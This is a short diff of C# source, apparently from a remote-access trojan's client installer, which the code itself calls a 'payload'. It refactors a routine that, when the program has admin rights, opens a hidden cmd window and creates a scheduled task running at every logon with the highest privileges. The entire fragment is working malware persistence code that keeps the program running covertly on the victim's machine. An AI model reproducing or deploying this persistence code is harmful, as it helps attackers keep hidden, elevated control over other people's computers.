@@ -31,10 +31,12 @@ namespace Client.Install
 
                     if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
                     {
+                        string taskName = Path.GetFileNameWithoutExtension(installPath.Name);
+                        string taskTarget = "\"" + installPath.FullName + "\"";
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = "cmd",
-                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
+                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + taskName + "\"" + " /tr " + taskTarget + " & exit",
                             WindowStyle = ProcessWindowStyle.Hidden,
                             CreateNoWindow = true,
                         });
